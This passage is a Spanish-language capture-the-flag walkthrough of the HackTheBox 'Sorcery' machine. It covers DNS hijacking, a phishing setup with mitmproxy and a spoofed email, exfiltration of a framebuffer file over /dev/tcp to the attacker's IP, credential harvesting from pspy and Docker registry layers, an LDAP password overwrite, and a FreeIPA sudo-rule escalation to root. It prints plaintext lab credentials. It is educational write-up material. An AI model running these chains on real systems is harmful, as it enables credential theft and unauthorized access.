┌──(venv)─(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ openssl x509 -req -in sv.csr -CA RootCA.crt -CAkey RootCA_decp.key -CAcreateserial -out sv.crt -days 14
Certificate request self-signature ok
subject=CN=zig.sorcery.htb

┌──(venv)─(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ cat sv.crt sv.key > sv.pem
```

El certificado quedó firmado por la RootCA interna — cualquier cliente de la infraestructura que confíe en esa RootCA aceptará este certificado sin ninguna alerta.

### DNS Hijacking

Desde el contenedor creé el archivo `hosts.user` apuntando `zig.sorcery.htb` a mi IP y reinicié `dnsmasq` para que cargara la nueva entrada. Importante — `dnsmasq` no recarga dinámicamente, necesita reiniciarse con los archivos actualizados:

```bash
user@7bfb70ee5b9c:/dns$ echo 10.10.15.121 zig.sorcery.htb > hosts.user
```

```bash
user@7bfb70ee5b9c:/dns$ pkill dnsmasq
user@7bfb70ee5b9c:/dns$ /usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts.user --addn-hosts /dns/hosts &
[2] 85
user@7bfb70ee5b9c:/dns$ dnsmasq: started, version 2.89 cachesize 150
dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
dnsmasq: reading /etc/resolv.conf
dnsmasq: using nameserver 127.0.0.11#53
dnsmasq: read /etc/hosts - 9 names
dnsmasq: read /dns/hosts - 28 names
dnsmasq: read /dns/hosts.user - 1 names

user@7bfb70ee5b9c:/dns$ dig zig.sorcery.htb

; <<>> DiG 9.18.28-1~deb12u2-Debian <<>> zig.sorcery.htb
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 35366
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; QUESTION SECTION:
;zig.sorcery.htb.               IN      A

;; Query time: 4001 msec
;; SERVER: 127.0.0.11#53(127.0.0.11) (UDP)
;; WHEN: Wed Apr 29 04:26:20 UTC 2026
;; MSG SIZE  rcvd: 33
```

`dnsmasq` confirmó que la entrada quedó cargada:

A partir de este momento, cualquier contenedor de la infraestructura que resolviera `zig.sorcery.htb` obtendría mi IP en vez de ningún resultado — el DNS hijacking estaba activo.

### Montar el servidor HTTPS falso

El bot visita la URL, verifica el certificado, y si todo cuadra introduce las credenciales en el formulario de login. La mejor forma de capturar eso sin levantar sospechas era usar `mitmdump` en modo **reverse proxy** apuntando al Gitea real en `git.sorcery.htb:443`.

Esto significaba que el bot vería el Gitea real con todas sus páginas, CSS y JS intactos — la única diferencia era que el certificado TLS que presentaba era el mío, firmado por la RootCA que yo controlaba, y que todo el tráfico pasaba por mitmproxy antes de llegar al Gitea real, incluyendo el POST de login con las credenciales en texto claro:

```bash
┌──(venv)─(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ sudo mitmdump --mode reverse:https://git.sorcery.htb -p 443 --ssl-insecure --certs '*=sv.pem' -w phis.mitm
[00:36:01.882] reverse proxy to https://git.sorcery.htb listening at *:443.
```

El `-w phis.mitm` guardaba todo el tráfico interceptado en un archivo para analizarlo después con `mitmweb`.

### Enviar el phishing

Con `swaks` mandé el email directamente al servidor de mail interno en `172.19.0.6:1025`. El cuerpo del email contenía un link a `https://zig.sorcery.htb/user/login` — cumpliendo las tres condiciones del blog simultáneamente: dominio `*.sorcery.htb`, HTTPS, certificado firmado por la RootCA interna:

```bash
┌──(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ proxychains swaks --server 172.19.6:1025 --from admin@sorcery.htb --to tom_summers@sorcery.htb --header "Subject: Verify gitea account" --add-header "Content-Type: text/html" --body '<a href="https://zig.sorcery.htb/user/login">Click here</a>' 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
=== Trying 172.19.6:1025...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.6:1025  ...  OK
=== Connected to 172.19.6.
<-  220 mailhog.example ESMTP MailHog
 -> EHLO kali
<-  250-Hello kali
<-  250-PIPELINING
<-  250 AUTH PLAIN
 -> MAIL FROM:<admin@sorcery.htb>
<-  250 Sender admin@sorcery.htb ok
 -> RCPT TO:<tom_summers@sorcery.htb>
<-  250 Recipient tom_summers@sorcery.htb ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Wed, 29 Apr 2026 00:44:19 -0400
 -> To: tom_summers@sorcery.htb
 -> From: admin@sorcery.htb
 -> Subject: Verify gitea account
 -> Message-Id: <20260429004419.147093@kali>
 -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
 -> Content-Type: text/html
 -> 
 -> <a href="https://zig.sorcery.htb/user/login">Click here</a>
 -> 
 -> 
 -> .
<-  250 Ok: queued as -7bkgFtaGjP1TKAB2ua36B-qf-hSG6Zl5k4uASBp85E=@mailhog.example
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

En MailHog confirmé que el email llegó a la bandeja de `tom_summers`. Unos minutos después vi actividad en mitmproxy — el bot visitó la URL, cargó todos los assets del Gitea real, y finalmente hizo un **POST a `/user/login`** con las credenciales.

[![](/assets/images/335.png)](/assets/images/335.png)

Al analizar el archivo `phis.mitm` con mitmweb encontré el formulario con las credenciales en texto claro:

[![](/assets/images/336.png)](/assets/images/336.png)

```
user_name: tom_summers
password:  jNsMKQ6k2.XDMPu.
```

Con esas credenciales me conecté directamente por SSH a la máquina host

```bash
┌──(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ ssh tom_summers@sorcery.htb 
(tom_summers@sorcery.htb) Password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Apr 30 06:29:16 2026 from 10.10.15.220
tom_summers@main:~$ ls
user.txt
```

---

## ROOT

### tom_summers_admin — Xvfb Framebuffer

Una vez dentro como `tom_summers` por SSH, lo primero que hice fue enumerar el sistema buscando procesos interesantes. Al revisar `ps auxww` me encontré con algo que llamó mi atención de inmediato:

```
tom_sum+    1445  0.0  0.7 227012 60404 ?        S    05:34   0:00 /usr/bin/Xvfb :1 -fbdir /xorg/xvfb -screen 0 512x256x24 -nolisten local
tom_sum+  1475  /usr/bin/mousepad /provision/cron/tom_summers_admin/passwords.txt
```

Xvfb — X Virtual FrameBuffer — es un servidor de display que implementa el protocolo X11 completamente en memoria, sin necesitar una pantalla física real. Se usa para correr aplicaciones gráficas de forma headless, es decir, sin que nadie las vea en un monitor. El flag crítico aquí es `-fbdir /xorg/xvfb` — este parámetro le dice a Xvfb que escriba el contenido raw del framebuffer a archivos en ese directorio. En otras palabras, lo que se está "mostrando" en esa pantalla virtual se está guardando en disco como un archivo binario.

Y lo que está corriendo en esa pantalla virtual es `mousepad` — un editor de texto gráfico — con un archivo llamado `passwords.txt` abierto. Si pudiera leer el framebuffer, vería exactamente lo que hay en pantalla.

Fui al directorio:


```bash
tom_summers@main:/xorg/xvfb$ ls -la
total 524
drwxr-xr-x 2 tom_summers_admin tom_summers_admin   4096 Apr 30 05:34 .
drwxr-xr-x 3 root              root                4096 Apr 28  2025 ..
-rwxr--r-- 1 tom_summers_admin tom_summers_admin 527520 Apr 30 05:34 Xvfb_screen0
tom_summers@main:/xorg/xvfb$ 
```

El archivo pertenece a `tom_summers_admin`, pero tiene permisos de lectura para todos los usuarios del sistema — `r--` en el último grupo de permisos. Eso significa que puedo leerlo sin ser `tom_summers_admin`. Lo transferí a mi Kali usando una conexión TCP directa con bash


```bash
┌──(kali㉿kali)-[~/Desktop/HTB/sorcery/content]
└─$ nc -lvnp 4444 > Xvfb_screen0
listening on [any] 4444 ...

tom_summers@main:/xorg/xvfb$ cat Xvfb_screen0 > /dev/tcp/10.10.15.220/4444
```

El archivo está en formato **XWD** (X Window Dump) — el formato nativo que usa Xvfb para los framebuffers. ImageMagick lo convierte directamente a PNG:


```bash
┌──(kali㉿kali)-[~/Desktop/HTB/sorcery/content]
└─$ convert xwd:Xvfb_screen0 x.png

┌──(kali㉿kali)-[~/Desktop/HTB/sorcery/content]
└─$ open x.png 
```

La imagen mostró el editor de texto con `passwords.txt` abierto y la contraseña de `tom_summers_admin` visible

[![](/assets/images/337.png)](/assets/images/337.png)

```
dWpuk7cesBjT-
```

Me conecté directamente por SSH:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/sorcery/content]
└─$ ssh tom_summers_admin@sorcery.htb

(tom_summers_admin@sorcery.htb) Password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Apr 30 06:49:48 2026 from 10.10.15.220
tom_summers_admin@main:~$ 
```

### donna_adams — Docker Registry + Credential Leak

Como `tom_summers_admin` lo primero que revisé fueron mis privilegios de sudo:

```bash
tom_summers_admin@main:~$ sudo -l
Matching Defaults entries for tom_summers_admin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tom_summers_admin may run the following commands on localhost:
    (rebecca_smith) NOPASSWD: /usr/bin/docker login
    (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
tom_summers_admin@main:~$ 
```

Dos comandos que podía ejecutar como `rebecca_smith` sin contraseña. Esto es importante porque me dice varias cosas:

Primero, `docker login` — este comando sirve para autenticarse contra un Docker Registry. El hecho de que esté configurado para correr como `rebecca_smith` implica que esa cuenta tiene credenciales para algún registry. Docker guarda esas credenciales usando un **credential helper** — un binario externo al que Docker delega el almacenamiento y recuperación de credenciales. En el `~/.docker/config.json` de `rebecca_smith` estaba definido `"credsStore": "docker-auth"`, lo que le dice a Docker que use el binario `/usr/bin/docker-credential-docker-auth` para gestionar las credenciales.

Segundo, `strace` contra cualquier PID — `strace` intercepta las syscalls de un proceso en tiempo real. Si consigo enganchar `strace` al proceso del credential helper mientras está corriendo, veré todas las operaciones que hace, incluyendo las escrituras a stdout con las credenciales en texto plano.

Antes de intentar cualquier cosa, lancé `pspy` para monitorizar los procesos del sistema y entender qué estaba ocurriendo de fondo. `pspy` es una herramienta que observa los procesos sin necesitar privilegios de root, capturando incluso procesos de corta duración que `ps` normal podría perderse:



```bash
tom_summers_admin@main:~$ ./pspy64 | tee ps.out
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/04/30 07:20:22 CMD: UID=2002  PID=179428 | tee ps.out 
2026/04/30 07:20:22 CMD: UID=2002  PID=179427 | ./pspy64 
2026/04/30 07:20:22 CMD: UID=0     PID=179053 | 
2026/04/30 07:20:22 CMD: UID=0     PID=176529 | 
2026/04/30 07:20:22 CMD: UID=0     PID=176508 | 
2026/04/30 07:20:22 CMD: UID=0     PID=173794 | 
2026/04/30 07:20:22 CMD: UID=0     PID=172211 | 
2026/04/30 07:20:22 CMD: UID=0     PID=171559 | 
2026/04/30 07:20:22 CMD: UID=0     PID=171116 | 
2026/04/30 07:20:22 CMD: UID=0     PID=164778 | 
2026/04/30 07:20:22 CMD: UID=0     PID=162525 | 
2026/04/30 07:20:22 CMD: UID=0     PID=162384 | 
2026/04/30 07:20:22 CMD: UID=0     PID=160942 | 
2026/04/30 07:20:22 CMD: UID=2002  PID=159660 | -bash 
2026/04/30 07:20:22 CMD: UID=2002  PID=159620 | sshd: tom_summers_admin@pts/2 
2026/04/30 07:20:22 CMD: UID=0     PID=159597 | sshd: tom_summers_admin [priv] 
2026/04/30 07:20:22 CMD: UID=0     PID=158321 | 
```

Después de unos minutos vi esto cada 10 minutos exactamente:

[![](/assets/images/338png.png)](/assets/images/338png.png)


```
2026/04/30 07:11:01 CMD: UID=0 PID=163932 | htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith -7eAZDp9-f9mg699914
```

Esto me reveló el panorama completo. Hay un proceso root que cada 10 minutos ejecuta `htpasswd` para regenerar el archivo de autenticación del Docker Registry con las credenciales de `rebecca_smith`. La contraseña tiene dos partes — una estática `-7eAZDp9-f9mg` y un OTP de 6 dígitos que rota cada 10 minutos. Con el OTP del momento lo verifiqué:

```bash
tom_summers_admin@main:~$ curl -u 'rebecca_smith:-7eAZDp9-f9mg310463' localhost:5000/v2/_catalog
{"repositories":["test-domain-workstation"]}
tom_summers_admin@main:~$ 
```

`/v2/_catalog` es el endpoint estándar de la API del Docker Registry v2 para listar todos los repositorios disponibles — es el equivalente a hacer `ls` en el registry. La respuesta confirmó que el registry estaba activo en `localhost:5000` y contenía un repositorio llamado `test-domain-workstation`.

Un Docker Registry almacena imágenes en **capas** — cada instrucción del Dockerfile genera una capa independiente que se comprime y guarda por separado. Cada capa tiene un hash SHA256 único. Lo que me interesaba era descargar esas capas y examinar su contenido, porque los Dockerfiles de provisioning suelen contener credenciales hardcodeadas en los comandos `RUN`, variables de entorno, o scripts de entrada.

Para llegar al registry desde mi Kali, monté un túnel SOCKS via SSH que redirigía el tráfico a través de la máquina:

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/sorcery/content]
└─$ ssh -D 1080 -N -f tom_summers_admin@sorcery.htb
(tom_summers_admin@sorcery.htb) Password: 
```

Luego usé **DockerRegistryGrabber** — una herramienta que automatiza la descarga de todas las capas de un registry dado las credenciales:

```bash
┌──(venv)─(kali㉿kali)-[~/…/HTB/sorcery/content/DockerRegistryGrabber]
└─$ proxychains python3 drg.py http://localhost --list -U 'rebecca_smith' -P'-7eAZDp9-f9mg310463' 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:5000  ...  OK
[+] test-domain-workstation
```

```bash
┌──(venv)─(kali㉿kali)-[~/…/HTB/sorcery/content/DockerRegistryGrabber]
└─$ proxychains python3 drg.py http://localhost --dump test-domain-workstation -U 'rebecca_smith' -P'-7eAZDp9-f9mg310463' 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:5000  ...  OK
[+] BlobSum found 10
[+] Dumping test-domain-workstation
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787
    [+] Downloading : bff382edc3a6db932abb361e3bd5aa09521886b0b79792616fc346b19a9497ea
    [+] Downloading : 92879ec4738326a2ab395b2427c2ba16d7dcf348f84477653a635c86d0146cb7
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : 802008e7f7617aa11266de164e757a6c8d7bb57ed4c972cf7e9f519dd0a21708
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    [+] Downloading : a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
```

Descargó 10 capas. La mayoría eran grandes — la base de Ubuntu y paquetes instalados. Pero una era sospechosamente pequeña, de solo 246 bytes:

```
292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787.tar.gz  246 bytes
```

Las capas pequeñas suelen corresponder a instrucciones `COPY` o `ADD` del Dockerfile que añaden archivos pequeños. La extraje:


```bash
┌──(venv)─(kali㉿kali)-[~/…/HTB/sorcery/content/DockerRegistryGrabber]
└─$ mkdir a    

┌──(venv)─(kali㉿kali)-[~/…/HTB/sorcery/content/DockerRegistryGrabber]
└─$ cd a                    

┌──(venv)─(kali㉿kali)-[~/…/sorcery/content/DockerRegistryGrabber/a]
└─$ tar -xvf ../test-domain-workstation/292e59a87dfb0fb3787c3889e4c1b81bfef0cd2f3378c61f281a4c7a02ad1787.tar.gz 
docker-entrypoint.sh
```


```bash
┌──(venv)─(kali㉿kali)-[~/…/sorcery/content/DockerRegistryGrabber/a]
└─$ cat docker-entrypoint.sh 
#!/bin/bash

ipa-client-install --unattended --principal donna_adams --password 3FEVPCT_c3xDH \
    --server dc01.sorcery.htb --domain sorcery.htb --no-ntp --force-join --mkhomedir
         
```

El script de entrada del contenedor `test-domain-workstation` era un script de provisioning que unía el workstation al dominio **FreeIPA** usando las credenciales de `donna_adams`. Las credenciales estaban en texto claro porque el script necesitaba autenticarse automáticamente sin interacción humana.

Me conecté como `donna_adams`:


```shell
┌──(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ ssh donna_adams@sorcery.htb
(donna_adams@sorcery.htb) Password: 
Creating directory '/home/donna_adams'.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
lawful.

Last login: Thu Apr 30 11:00:47 2026 from 10.10.15.220
donna_adams@main:~$ 
```

### ash_winter — FreeIPA LDAP Password Write

Antes de explicar qué hice, es necesario entender qué es **FreeIPA**. FreeIPA es una solución de gestión de identidades centralizada para Linux — el equivalente open source a Active Directory de Microsoft. Gestiona usuarios, grupos, políticas de sudo, reglas de acceso (HBAC), y autenticación Kerberos para todos los hosts del dominio. En este caso, el dominio es `sorcery.htb` y el servidor IPA es `dc01.sorcery.htb` corriendo en el contenedor Docker en `172.23.0.2`. La máquina `main` está unida a ese dominio, lo que significa que sus usuarios, grupos y reglas de sudo se gestionan centralmente desde el servidor IPA.

Como `donna_adams` ya tenía un ticket Kerberos activo generado automáticamente al hacer SSH — PAM llama a `kinit` en el background en cada login exitoso. Eso me permitía usar las herramientas de IPA autenticado sin introducir contraseña:

```shell
donna_adams@main:~$ klist
Ticket cache: KEYRING:persistent:1638400003:krb_ccache_C49vLH9
Default principal: donna_adams@SORCERY.HTB

Valid starting     Expires            Service principal
04/30/26 11:00:46  05/01/26 10:07:38  krbtgt/SORCERY.HTB@SORCERY.HTB
donna_adams@main:~$ 
```

Consulté mi perfil en el dominio:

```shell
donna_adams@main:~$ ipa user-show donna_adams
  User login: donna_adams
  First name: donna
  Last name: adams
  Home directory: /home/donna_adams
  Login shell: /bin/sh
  Principal name: donna_adams@SORCERY.HTB
  Principal alias: donna_adams@SORCERY.HTB
  Email address: donna_adams@sorcery.htb
  UID: 1638400003
  GID: 1638400003
  Account disabled: False
  Password: True
  Member of groups: ipausers
  Member of HBAC rule: allow_ssh, allow_sudo
  Indirect Member of role: change_userPassword_ash_winter_ldap
  Kerberos keys available: True
```

Tenía asignado un rol cuyo nombre era completamente explícito — `change_userPassword_ash_winter_ldap`. En FreeIPA, los roles son colecciones de privilegios LDAP que determinan qué operaciones puede realizar un usuario en el directorio. Este rol específicamente me daba permiso para escribir el atributo `userPassword` del usuario `ash_winter` directamente en LDAP.

La diferencia entre esto y el comando `ipa passwd` estándar es importante — `ipa passwd` va por el mecanismo de cambio de contraseña de Kerberos (puerto 464, `kpasswd`) que tiene restricciones adicionales. Lo que este rol permite es una escritura LDAP directa al atributo, lo que es suficiente para establecer cualquier contraseña sin necesitar conocer la actual.

Con el ticket Kerberos activo ejecuté `ldapmodify` autenticado via GSSAPI — el mecanismo que usa Kerberos sobre LDAP:


```bash
donna_adams@main:~$ ldapmodify -Y GSSAPI -H ldap://dc01.sorcery.htb <<'EOF'
dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
changetype: modify
replace: userPassword
userPassword: zig123!
EOF
SASL/GSSAPI authentication started
SASL username: donna_adams@SORCERY.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb"

donna_adams@main:~$ 
```

La contraseña fue marcada como expirada por el sistema — IPA obliga a cambiarla en el primer login cuando se modifica externamente. Me conecté por SSH y la cambié:

```shell
┌──(kali㉿kali)-[~/…/content/kafka/kafka_2.13-3.9.2/bin]
└─$ ssh ash_winter@sorcery.htb 
(ash_winter@sorcery.htb) Password: 
Password expired. Change your password now.
(ash_winter@sorcery.htb) Current Password: 
(ash_winter@sorcery.htb) New password: 
(ash_winter@sorcery.htb) Retype new password: 
Creating directory '/home/ash_winter'.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Thu Apr 30 11:08:48 2026 from 10.10.15.220
ash_winter@main:~$ 
# Current Password: zig123!
# New password: zig1234!
```

### root — FreeIPA CVE-2025-7493 + sssd

Como `ash_winter` revisé mi perfil en IPA:


```bash
ash_winter@main:~$ ipa user-show ash_winter
  User login: ash_winter
  First name: ash
  Last name: winter
  Home directory: /home/ash_winter
  Login shell: /bin/sh
  Principal name: ash_winter@SORCERY.HTB
  Principal alias: ash_winter@SORCERY.HTB
  Email address: ash_winter@sorcery.htb
  UID: 1638400004
  GID: 1638400004
  Account disabled: False
  Password: True
  Member of groups: ipausers
  Member of HBAC rule: allow_sudo, allow_ssh
  Indirect Member of role: add_sysadmin
  Kerberos keys available: True
```

Tenía otro rol, `add_sysadmin`. Antes de actuar, enumeré los grupos y reglas de sudo del dominio para entender la estructura:

```bash
ash_winter@main:~$ ipa group-find --all
----------------
5 groups matched
----------------
  dn: cn=admins,cn=groups,cn=accounts,dc=sorcery,dc=htb
  Group name: admins
  Description: Account administrators group
  GID: 1638400000
  Member users: admin
  ipantsecurityidentifier: S-1-5-21-820725746-4072777037-1046661441-512
  ipauniqueid: 30051a92-96eb-11ef-a395-0242ac170002
  objectclass: top, groupofnames, posixgroup, ipausergroup, ipaobject, nestedGroup, ipaNTGroupAttrs

  dn: cn=editors,cn=groups,cn=accounts,dc=sorcery,dc=htb
  Group name: editors
  Description: Limited admins who can edit other users
  GID: 1638400002
  ipantsecurityidentifier: S-1-5-21-820725746-4072777037-1046661441-1002
  ipauniqueid: 30055df4-96eb-11ef-9a7a-0242ac170002
  objectclass: top, groupofnames, posixgroup, ipausergroup, ipaobject, nestedGroup, ipantgroupattrs

  dn: cn=ipausers,cn=groups,cn=accounts,dc=sorcery,dc=htb
  Group name: ipausers
  Description: Default group for all users
  Member users: donna_adams, ash_winter
  ipauniqueid: 300541ac-96eb-11ef-8324-0242ac170002
  objectclass: top, groupofnames, nestedgroup, ipausergroup, ipaobject

  dn: cn=sysadmins,cn=groups,cn=accounts,dc=sorcery,dc=htb
  Group name: sysadmins
  GID: 1638400005
  Indirect Member of role: manage_sudorules_ldap
  ipantsecurityidentifier: S-1-5-21-820725746-4072777037-1046661441-1005
  ipauniqueid: d038b410-96eb-11ef-ace5-0242ac170002
  objectclass: top, groupofnames, nestedgroup, ipausergroup, ipaobject, posixgroup, ipantgroupattrs

  dn: cn=trust admins,cn=groups,cn=accounts,dc=sorcery,dc=htb
  Group name: trust admins
  Description: Trusts administrators group
  Member users: admin
  ipauniqueid: 9534bbe8-96eb-11ef-8555-0242ac170002
  objectclass: top, groupofnames, ipausergroup, nestedgroup, ipaobject
----------------------------
Number of entries returned 5
----------------------------
```

Encontré un grupo llamado `sysadmins` que era miembro indirecto del rol `manage_sudorules_ldap` — es decir, quien pertenezca a `sysadmins` puede gestionar las reglas de sudo del dominio IPA via LDAP.


```bash
ash_winter@main:~$ ipa sudorule-find
-------------------
1 Sudo Rule matched
-------------------
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
----------------------------
Number of entries returned 1
----------------------------
```

Existía una única regla de sudo llamada `allow_sudo` con `Command category: all`, `RunAs User category: all` — básicamente `ALL=(ALL:ALL) ALL`, los privilegios totales de sudo.

El **CVE-2025-7493** afecta a FreeIPA 4.11.1 — exactamente la versión instalada. 

```bash
ash_winter@main:~$ ipa --version
VERSION: 4.11.1, API_VERSION: 2.253
ash_winter@main:
```

La vulnerabilidad consiste en que la validación de permisos al añadir usuarios a reglas de sudo es incorrecta, permitiendo que un usuario regular con el rol adecuado se añada a sí mismo a reglas de sudo sin que el servidor lo rechace.

Primero me añadí al grupo `sysadmins` — mi rol `add_sysadmin` me lo permitía:

```bash
ash_winter@main:~$ ipa group-add-member sysadmins --users=ash_winter
  Group name: sysadmins
  GID: 1638400005
  Member users: ash_winter
  Indirect Member of role: manage_sudorules_ldap
-------------------------
Number of members added 1
-------------------------
```


Luego me añadí directamente a la regla `allow_sudo` — aquí es donde entra el CVE, porque un usuario normal no debería poder modificar reglas de sudo:


```bash
ash_winter@main:~$ ipa sudorule-add-user allow_sudo --users=ash_winter
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
  Users: admin, ash_winter
-------------------------
Number of members added 1
-------------------------
```

Los cambios en FreeIPA no se aplican inmediatamente en la máquina — **SSSD** (System Security Services Daemon) es el demonio que actúa de caché entre la máquina Linux y el servidor IPA. SSSD descarga periódicamente las políticas del dominio y las cachea localmente. Para que los nuevos privilegios de sudo surtieran efecto sin esperar al próximo ciclo de caché, necesitaba reiniciar SSSD — y precisamente `ash_winter` tenía permiso para hacerlo:

```bash
ash_winter@main:~$ sudo systemctl restart sssd
```

Tras el reinicio SSSD sincronizó las reglas del dominio y logro escalar a root finalmente y leer la flag final

```bash
ash_winter@main:~$ sudo -l
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
    (ALL : ALL) ALL
ash_winter@main:~$ sudo su
[sudo] password for ash_winter: 
root@main:/home/ash_winter# cd /root
root@main:~# ls
root.txt
root@main:~# 
```
